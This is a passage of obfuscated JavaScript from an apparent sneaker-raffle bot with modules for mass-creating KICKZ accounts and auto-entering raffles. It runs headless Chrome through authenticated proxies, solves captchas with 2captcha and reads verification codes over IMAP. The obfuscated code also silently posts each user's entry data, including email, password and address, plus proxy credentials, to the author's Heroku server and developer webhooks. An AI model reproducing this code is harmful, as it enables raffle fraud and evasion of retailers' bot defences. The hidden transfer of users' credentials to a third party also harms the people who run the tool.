                        await _0xd91825['waitForSelector']('#comp_address1'), await _0xd91825['type']('#comp_address1', _0x586dfb[_0x916f5a]['Address1'] + '\x20' + _0x586dfb[_0x916f5a]['HouseNumber']), await _0xd91825['waitForSelector']('#comp_address2'), await _0xd91825['type']('#comp_address2', '' + _0x586dfb[_0x916f5a]['Address2']), await _0xd91825['waitForSelector']('#comp_address2'), await _0xd91825['type']('#comp_address3', '' + _0x586dfb[_0x916f5a]['City']), await _0xd91825['waitForSelector']('#comp_postcode'), await _0xd91825['type']('#comp_postcode', '' + _0x586dfb[_0x916f5a]['Zip']), console['log'](_0x3b5c2b() + '\x20[' + _0x44d621['name'] + ']\x20Task\x20' + (_0x916f5a + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x505897(0x4b0), await _0xd91825['click']('label#emailhold'), await _0x505897(0x5dc), await _0xd91825['click']('#preauth_tandc_email\x20>\x20label'), await _0x505897(0x5dc), await _0xd91825['click']('#submit');
                        try {
                            await _0xd91825['waitForSelector']('#paymentWrap');
                        } catch {
                            throw new Error('Could\x20not\x20find\x20Payment');
                        }
                        console['log'](_0x3b5c2b() + '\x20[' + _0x44d621['name'] + ']\x20Task\x20' + (_0x916f5a + 0x1) + '\x20:\x20' + _0x4e59da['blue']('Awaiting\x20Paypal\x20Payment')), _0x4d2fe4['on']('targetcreated', async _0x1ddb1e => {
                            if (_0x1ddb1e['type']() === 'page') {
                                const _0x2b32dd = await _0x1ddb1e['page']();
                                async function _0x36ae93() {
                                    try {
                                        await _0xd91825['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x479f3d = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x5dc9d8() {
                                    try {
                                        await _0xd91825['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x1d22c5 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x5dc9d8(), _0x36ae93(), await _0x505897(0x493e0);
                            }
                        });
                        async function _0x33dde3() {
                            for (let _0x2de720 = 0x0; _0x2de720 < 0x12c; _0x2de720++) {
                                if (_0x1d22c5 == !![]) {
                                    _0x34906a = 'no', _0x11df74(_0x586dfb[_0x916f5a], _0x44d621), console['log'](_0x4e59da['green'](_0x3b5c2b() + '\x20[' + _0x44d621['name'] + ']\x20Task\x20' + (_0x916f5a + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '')
                                        try {
                                            await _0x1abce0(_0x4acd48['webhook'], _0x5d12ff['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x505897(0xc8), await _0x1abce0(_0x5640fd, _0x5d12ff['succesDEVMSG']), await _0x505897(0xc8);
                                    try {
                                        await _0x1abce0(_0x1b595f, _0x5d12ff['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x479f3d)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x505897(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x505897(0xbb8), await _0xd91825['click']('.zoid-outlet'), await _0x505897(0x7d0), await _0x33dde3();
                    } catch (_0x38062e) {
                        console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x44d621['name'] + ']\x20Task\x20' + (_0x916f5a + 0x1) + '\x20:\x20' + _0x38062e)), _0x5aa130 = '' + _0x38062e;
                        var _0x1e7545 = await _0x429bf8(_0x586dfb[_0x916f5a], _0x44d621, 'dev', !![], _0x5aa130);
                        _0x5d12ff['errorDEV'] = { 'embeds': [_0x1e7545] }, _0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '' && await _0x1abce0(_0x4acd48['webhook'], _0x5d12ff['errorDEV']), await _0x1abce0(_0x3b044a, _0x5d12ff['errorDEV']);
                    } finally {
                        _0x4d2fe4 && _0x4d2fe4['close']();
                        if (_0x34906a == 'yes' && _0xa7a4e6 != 0x5 && _0x5aa130 != 'Size\x20Not\x20Found') {
                            console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x44d621['name'] + ']\x20Task\x20' + (_0x916f5a + 0x1) + '\x20:\x20Retrying\x20(' + _0xa7a4e6 + '\x20/\x205)')), _0x916f5a = _0x916f5a - 0x1, _0xa7a4e6 = _0xa7a4e6 + 0x1;
                            continue;
                        }
                        _0x34906a == 'yes' && _0xa7a4e6 >= 0x5 && (_0x260c2d(afew[_0x916f5a], _0x44d621), _0x34906a = 'no', _0xa7a4e6 = 0x0), console['log']('Waiting\x20for\x20' + _0x4acd48['delay'] + '\x20ms'), await _0x505897(_0x4acd48['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x52fb3, _0x2c1570, _0x1ce6d8) {
                    _0x367f42['use'](_0x156bf2()), _0x367f42['use'](_0x5ad8e2({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4acd48['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3af28a = 0x0; _0x3af28a < _0x2c1570['length']; _0x3af28a++) {
                        const _0x1df8d9 = 'https://www.kickz.com/login';
                        if (_0x18f8e9 != 'yes')
                            var _0x18f8e9 = '', _0x30d02a = 0x0;
                        _0x4041fe(_0x52fb3['name'] + '\x20Task\x20' + (_0x3af28a + 0x1) + '\x20/\x20' + _0x2c1570['length'] + '\x20||\x20File:\x20' + _0x22c4ed + '\x20Proxies:\x20' + _0x5a9fd8);
                        try {
                            await _0x43797b(_0x2c1570, _0x3af28a);
                        } catch {
                            _0x18f8e9 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x325a2b = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0xdaef84
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x4acd48['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x5d34b4
                                }
                            ]
                        }];
                        const _0x51345b = { 'embeds': _0x325a2b };
                        var _0x2002b4 = await _0x429bf8(_0x2c1570[_0x3af28a], _0x52fb3, 'acc', ![]);
                        const _0x17ddf5 = { 'succesDEVMSG': { 'embeds': [_0x2002b4] } };
                        if (_0x2c1570[_0x3af28a]['Email'] == '' || _0x2c1570[_0x3af28a]['FirstName'] == '' || _0x2c1570[_0x3af28a]['LastName'] == '') {
                            console['log'](_0x3b5c2b() + '\x20[' + _0x52fb3['name'] + ']\x20Task\x20' + (_0x3af28a + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x2c1570[_0x3af28a]['Password'] == '' && (_0x2c1570[_0x3af28a]['Password'] = 'JRaffles23!');
                        if (_0x4acd48['useRandomProxy'] = ![])
                            var _0x355b56 = _0x1ce6d8[_0x3af28a]['split'](':');
                        else
                            var _0x2cf0c8 = Math['round'](Math['random']() * (_0x1ce6d8['length'] - 0x1)), _0x355b56 = _0x1ce6d8[_0x2cf0c8]['split'](':');
                        var _0x265ac2;
                        try {
                            _0x265ac2 = await _0x367f42['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x355b56[0x0] + ':' + _0x355b56[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x265ac2 = await _0x367f42['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x355b56[0x0] + ':' + _0x355b56[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x5d53d3 = await _0x265ac2['newPage']();
                            await _0x5d53d3['authenticate']({
                                'username': '' + _0x355b56[0x2],
                                'password': '' + _0x355b56[0x3]
                            }), console['log'](_0x3b5c2b() + '\x20[' + _0x52fb3['name'] + ']\x20Task\x20' + (_0x3af28a + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5d53d3['setRequestInterception'](!![]), _0x5d53d3['on']('request', _0x43b2d1 => {
                                _0x43b2d1['resourceType']() === 'image' || _0x43b2d1['resourceType']() === 'font' || _0x43b2d1['resourceType']() === 'media' ? _0x43b2d1['abort']() : _0x43b2d1['continue']();
                            }), await _0x5d53d3['goto'](_0x1df8d9), await _0x505897(0xbb8), console['log'](_0x3b5c2b() + '\x20[' + _0x52fb3['name'] + ']\x20Task\x20' + (_0x3af28a + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x5d53d3['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x5d53d3['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x5d53d3['waitForSelector']('#button-register'), await _0x505897(0x7d0), await _0x5d53d3['evaluate'](() => {
                                const _0x146818 = document['querySelector']('#button-register');
                                _0x146818['click']();
                            }), console['log'](_0x3b5c2b() + '\x20[' + _0x52fb3['name'] + ']\x20Task\x20' + (_0x3af28a + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x505897(0x1388), await _0x5d53d3['waitForSelector']('#customer_salutation'), await _0x5d53d3['select']('#customer_salutation', 'mr'), await _0x505897(0x7d0), await _0x5d53d3['waitForSelector']('#customer_firstname'), await _0x5d53d3['type']('#customer_firstname', '' + _0x2c1570[_0x3af28a]['FirstName']), await _0x505897(0x352), await _0x5d53d3['waitForSelector']('#customer_lastname'), await _0x5d53d3['type']('#customer_lastname', '' + _0x2c1570[_0x3af28a]['LastName']), await _0x505897(0x352), await _0x5d53d3['type']('#email-input', '' + _0x2c1570[_0x3af28a]['Email']), await _0x505897(0x352), await _0x5d53d3['type']('#email-confirm-input', '' + _0x2c1570[_0x3af28a]['Email']), await _0x505897(0x352), await _0x5d53d3['type']('#register-password', '' + _0x2c1570[_0x3af28a]['Password']), await _0x505897(0x352), await _0x5d53d3['type']('#password-confirm', '' + _0x2c1570[_0x3af28a]['Password']), await _0x505897(0x352), console['log'](_0x3b5c2b() + '\x20[' + _0x52fb3['name'] + ']\x20Task\x20' + (_0x3af28a + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x5d53d3['click']('#consent'), await _0x505897(0x1f4);
                            const _0x566377 = await _0x5d53d3['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x566377) {
                                console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x52fb3['name'] + ']\x20Task\x20' + (_0x3af28a + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x5d53d3['click']('#buttonRegister');
                            try {
                                await _0x5d53d3['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x3b5c2b() + '\x20[' + _0x52fb3['name'] + ']\x20Task\x20' + (_0x3af28a + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x2c1570[_0x3af28a]['Email']), await _0x505897(0x4b0);
                            async function _0x3b2102() {
                                var _0x58319b, _0x175844 = ![];
                                for (var _0x5c79dd = 0x0; _0x5c79dd < 0x18; _0x5c79dd++) {
                                    async function _0x36ae26() {
                                        var _0x3147e7 = new _0x196441({
                                            'user': _0x4acd48['masterMail'],
                                            'password': _0x4acd48['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x5cacd7(_0xfdd470) {
                                            _0x3147e7['openBox']('INBOX', ![], _0xfdd470);
                                        }
                                        _0x3147e7['once']('ready', function () {
                                            console['log'](_0x3b5c2b() + '\x20[' + _0x52fb3['name'] + ']\x20Task\x20' + (_0x3af28a + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x5cacd7(function (_0x3470e4, _0x1e2e00) {
                                                console['log'](_0x3b5c2b() + '\x20[' + _0x52fb3['name'] + ']\x20Task\x20' + (_0x3af28a + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x3470e4)
                                                    throw _0x3470e4;
                                                _0x3147e7['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x5d9177, _0xa0f12d) {
                                                    if (!_0xa0f12d || !_0xa0f12d['length'])
                                                        console['log'](_0x3b5c2b() + '\x20[' + _0x52fb3['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x3147e7['end']();
                                                    else {
                                                        var _0x1ddd91 = _0x3147e7['seq']['fetch'](_0xa0f12d, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x1ddd91['on']('message', function (_0x2ee6f0, _0x390235) {
                                                            var _0xfccacf = '(#' + _0x390235 + ')\x20';
                                                            _0x2ee6f0['on']('body', function (_0x305cd9, _0x24dbfb) {
                                                                _0x158053(_0x305cd9, (_0x2780e2, _0x345c68) => {
                                                                    if (_0x345c68['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x157f51 = _0x345c68['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x1b6c29 = _0x157f51[0x1]['split']('<')[0x0];
                                                                        _0x58319b = _0x1b6c29;
                                                                    }
                                                                });
                                                            }), _0x2ee6f0['once']('end', function () {
                                                            });
                                                        }), _0x1ddd91['once']('error', function (_0x2e5143) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x1ddd91['once']('end', function () {
                                                            _0x3147e7['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x3147e7['once']('error', function (_0x5dba41) {
                                            console['log'](_0x4e59da['red'](_0x5dba41['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x175844 = !![];
                                        }), _0x3147e7['once']('end', async function () {
                                        }), _0x3147e7['connect']();
                                    }
                                    _0x36ae26(), await _0x505897(0x1388);
                                    if (_0x58319b)
                                        return _0x58319b;
                                    if (_0x175844)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x5c79dd == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x3b2102(), _0x505897(0x320), console['log'](_0x3b5c2b() + '\x20[' + _0x52fb3['name'] + ']\x20Task\x20' + (_0x3af28a + 0x1) + '\x20:\x20Verifying..'), await _0x5d53d3['type']('#verificationCode', code), await _0x505897(0x1f4), await _0x5d53d3['click']('#buttonVerify'), await _0x505897(0x190), await _0x5d53d3['click']('#buttonVerify'), await _0x505897(0x3e8);
                            try {
                                await _0x5d53d3['waitForSelector']('div.b-user_greeting'), _0x18f8e9 = 'no', console['log'](_0x4e59da['green'](_0x3b5c2b() + '\x20[' + _0x52fb3['name'] + ']\x20Task\x20' + (_0x3af28a + 0x1) + '\x20:\x20Account\x20' + _0x2c1570[_0x3af28a]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x5d8933['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x2c1570[_0x3af28a]['Email'] + ',' + _0x2c1570[_0x3af28a]['Password'] + ','), console['log'](_0x3b5c2b() + '\x20[' + _0x52fb3['name'] + ']\x20Task\x20' + (_0x3af28a + 0x1) + '\x20:\x20Account\x20' + _0x2c1570[_0x3af28a]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '' && await _0x1abce0(_0x4acd48['webhook'], _0x17ddf5['succesDEVMSG']);
                                } catch {
                                }
                                await _0x1abce0(_0x3faf08, _0x17ddf5['succesDEVMSG']);
                            } catch {
                                _0x18f8e9 = 'no', console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x52fb3['name'] + ']\x20Task\x20' + (_0x3af28a + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x52fb3['name'] + ']\x20Task\x20' + (_0x3af28a + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x5822bc) {
                            console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x52fb3['name'] + ']\x20Task\x20' + (_0x3af28a + 0x1) + '\x20:\x20' + _0x5822bc)), _0x325a2b[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x325a2b[0x0]['description'] = '' + _0x5822bc, await _0x1abce0(_0x3b044a, _0x51345b), _0x18f8e9 = 'yes';
                        } finally {
                            _0x265ac2 && _0x265ac2['close']();
                            if (_0x18f8e9 == 'yes' && _0x30d02a != 0x5) {
                                console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x52fb3['name'] + ']\x20Task\x20' + (_0x3af28a + 0x1) + '\x20:\x20Retrying\x20(' + _0x30d02a + '\x20/\x205)')), _0x3af28a = _0x3af28a - 0x1, _0x30d02a = _0x30d02a + 0x1;
                                continue;
                            }
                            _0x18f8e9 == 'yes' && _0x30d02a >= 0x5 && (_0x260c2d(_0x2c1570[_0x3af28a], _0x52fb3), _0x18f8e9 = 'no', _0x30d02a = 0x0), console['log']('Waiting\x20for\x20' + _0x4acd48['delay'] + '\x20ms'), await _0x505897(_0x4acd48['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x5801a6, _0x511c22, _0x57f083) {
                    _0x367f42['use'](_0x156bf2()), _0x367f42['use'](_0x5ad8e2({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4acd48['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x51037c = 0x0; _0x51037c < _0x511c22['length']; _0x51037c++) {
                        var _0x57a129;
                        if (_0x21e7b3 != 'yes')
                            var _0x21e7b3 = '', _0x14f443 = 0x0;
                        _0x4041fe(_0x5801a6['name'] + '\x20Task\x20' + (_0x51037c + 0x1) + '\x20/\x20' + _0x511c22['length'] + '\x20||\x20File:\x20' + _0x22c4ed + '\x20Proxies:\x20' + _0x5a9fd8);
                        var _0x5b583a = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0xdaef84
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x511c22[_0x51037c]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x511c22[_0x51037c]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x4acd48['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x5d34b4
                                }
                            ]
                        }], _0xda6dfb = await _0x429bf8(_0x511c22[_0x51037c], _0x5801a6, 'dev', ![]), _0x341183 = await _0x429bf8(_0x511c22[_0x51037c], _0x5801a6, 'pub', ![]);
                        const _0x992dd9 = {
                            'succesDEVMSG': { 'embeds': [_0xda6dfb] },
                            'succesPUBMSG': { 'embeds': [_0x341183] }
                        };
                        try {
                            await _0x43797b(_0x511c22, _0x51037c);
                        } catch {
                            _0x21e7b3 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x511c22[_0x51037c]['Email'] == '' || _0x511c22[_0x51037c]['Password'] == '' || _0x511c22[_0x51037c]['FirstName'] == '' || _0x511c22[_0x51037c]['LastName'] == '') {
                            console['log'](_0x3b5c2b() + '\x20[' + _0x5801a6['name'] + ']\x20Task\x20' + (_0x51037c + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x4acd48['useRandomProxy'] = ![])
                            var _0x3e623a = _0x57f083[_0x51037c]['split'](':');
                        else
                            var _0x87121 = Math['round'](Math['random']() * (_0x57f083['length'] - 0x1)), _0x3e623a = _0x57f083[_0x87121]['split'](':');
                        var _0x46c871;
                        try {
                            _0x46c871 = await _0x367f42['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x3e623a[0x0] + ':' + _0x3e623a[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x46c871 = await _0x367f42['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x3e623a[0x0] + ':' + _0x3e623a[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x3cef01 = await _0x46c871['newPage']();
                            await _0x3cef01['authenticate']({
                                'username': '' + _0x3e623a[0x2],
                                'password': '' + _0x3e623a[0x3]
                            }), console['log'](_0x3b5c2b() + '\x20[' + _0x5801a6['name'] + ']\x20Task\x20' + (_0x51037c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3cef01['setRequestInterception'](!![]), _0x3cef01['on']('request', _0x564f1f => {
                                _0x564f1f['resourceType']() === 'image' || _0x564f1f['resourceType']() === 'font' || _0x564f1f['resourceType']() === 'media' ? _0x564f1f['abort']() : _0x564f1f['continue']();
                            }), await _0x3cef01['goto']('' + _0x511c22[_0x51037c]['Url'], { 'waitUntil': 'networkidle2' }), await _0x505897(0x12c);
                            try {
                                await _0x3cef01['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x3cef01['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x3b5c2b() + '\x20[' + _0x5801a6['name'] + ']\x20Task\x20' + (_0x51037c + 0x1) + '\x20:\x20Logging\x20in'), await _0x3cef01['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x3cef01['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x3cef01['waitForSelector']('#username'), await _0x3cef01['type']('#username', _0x511c22[_0x51037c]['Email']), await _0x3cef01['waitForSelector']('#password'), await _0x3cef01['type']('#password', _0x511c22[_0x51037c]['Password']), await _0x505897(0x190), await _0x3cef01['click']('#buttonSubmit'), await _0x3cef01['waitForSelector']('div.b-user_greeting'), console['log'](_0x3b5c2b() + '\x20[' + _0x5801a6['name'] + ']\x20Task\x20' + (_0x51037c + 0x1) + '\x20:\x20Getting\x20Product'), await _0x505897(0x1f4), await _0x3cef01['goto']('' + _0x511c22[_0x51037c]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x3b5c2b() + '\x20[' + _0x5801a6['name'] + ']\x20Task\x20' + (_0x51037c + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x511c22[_0x51037c]['Size']);
                            let _0x52afe9 = _0x511c22[_0x51037c]['Size']['replace']('.5', '\x201/2');
                            await _0x3cef01['click']('button[title=\x22' + _0x52afe9 + '\x22]'), await _0x505897(0x1f4);
                            try {
                                await _0x3cef01['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0x505897(0x12c), console['log'](_0x3b5c2b() + '\x20[' + _0x5801a6['name'] + ']\x20Task\x20' + (_0x51037c + 0x1) + '\x20:\x20Filling\x20Information'), await _0x3cef01['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x505897(0x12c), await _0x3cef01['type']('#dwfrm_raffle_addressFields_firstName', _0x511c22[_0x51037c]['FirstName']), await _0x505897(0x12c), await _0x3cef01['type']('#dwfrm_raffle_addressFields_lastName', _0x511c22[_0x51037c]['LastName']), await _0x505897(0x12c), await _0x3cef01['select']('#dwfrm_raffle_addressFields_country', _0x511c22[_0x51037c]['Country']), await _0x505897(0x12c), await _0x3cef01['type']('#dwfrm_raffle_addressFields_city', _0x511c22[_0x51037c]['City']), await _0x505897(0x12c);
                            _0x511c22[_0x51037c]['Postcode'] == undefined && (_0x511c22[_0x51037c]['Postcode'] = _0x511c22[_0x51037c]['Zip']);
                            await _0x3cef01['type']('#dwfrm_raffle_addressFields_postalCode', _0x511c22[_0x51037c]['Postcode']), await _0x505897(0x12c), await _0x3cef01['type']('#dwfrm_raffle_addressFields_address1', _0x511c22[_0x51037c]['Address1']), await _0x505897(0x12c), await _0x3cef01['type']('#dwfrm_raffle_addressFields_address2', _0x511c22[_0x51037c]['HouseNumber']), await _0x505897(0x12c), await _0x3cef01['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x511c22[_0x51037c]['Address2']), await _0x505897(0x12c), await _0x3cef01['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x505897(0x12c), await _0x3cef01['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x511c22[_0x51037c]['Follower']), await _0x505897(0x1f4), await _0x3cef01['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x505897(0x1f4), console['log'](_0x3b5c2b() + '\x20[' + _0x5801a6['name'] + ']\x20Task\x20' + (_0x51037c + 0x1) + '\x20:\x20' + _0x4e59da['blue']('Awaiting\x20Paypal\x20Payment')), await _0x3cef01['click']('.b-paypal_button');
                            try {
                                await _0x3cef01['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x21e7b3 = 'no', _0x11df74(_0x511c22[_0x51037c], _0x5801a6), console['log'](_0x4e59da['green'](_0x3b5c2b() + '\x20[' + _0x5801a6['name'] + ']\x20Task\x20' + (_0x51037c + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                _0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '' && await _0x1abce0(_0x4acd48['webhook'], _0x992dd9['succesDEVMSG']);
                                await _0x505897(0xc8), await _0x1abce0(_0x5640fd, _0x992dd9['succesDEVMSG']), await _0x505897(0xc8), await _0x1abce0(_0x1b595f, _0x992dd9['succesPUBMSG']);
                                let _0x566cce = _0x511c22[_0x51037c];
                                try {
                                    prxdata = {
                                        'username': _0xdaef84['replace']('#', ''),
                                        'module': _0x5801a6['name'],
                                        'entrydata': JSON['stringify'](_0x566cce),
                                        'proxy': '' + _0x57f083[_0x51037c]
                                    };
                                    var _0x1f9cd8 = JSON['stringify'](prxdata);
                                    let _0x6d94ec = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x577975['post']('https://jraffles.herokuapp.com/success', _0x1f9cd8, _0x6d94ec);
                                } catch (_0x750434) {
                                }
                            } catch (_0x2706dd) {
                                console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x5801a6['name'] + ']\x20Task\x20' + (_0x51037c + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x2706dd)), _0x57a129 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x2706dd;
                                var _0x3e140d = await _0x429bf8(_0x511c22[_0x51037c], _0x5801a6, 'dev', !![], _0x57a129);
                                _0x992dd9['errorDEV'] = { 'embeds': [_0x3e140d] }, _0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '' && await _0x1abce0(_0x4acd48['webhook'], _0x992dd9['errorDEV']), await _0x1abce0(_0x3b044a, _0x992dd9['errorDEV']);
                            }
                        } catch (_0x4166e9) {
                            console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x5801a6['name'] + ']\x20Task\x20' + (_0x51037c + 0x1) + '\x20:\x20' + _0x4166e9)), _0x57a129 = '' + _0x4166e9;
                            var _0x3e140d = await _0x429bf8(_0x511c22[_0x51037c], _0x5801a6, 'dev', !![], _0x57a129);
                            _0x992dd9['errorDEV'] = { 'embeds': [_0x3e140d] }, _0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '' && await _0x1abce0(_0x4acd48['webhook'], _0x992dd9['errorDEV']), await _0x1abce0(_0x3b044a, _0x992dd9['errorDEV']), _0x21e7b3 = 'yes';
                        } finally {
                            _0x46c871 && _0x46c871['close']();
                            if (_0x21e7b3 == 'yes' && _0x14f443 != 0x5) {
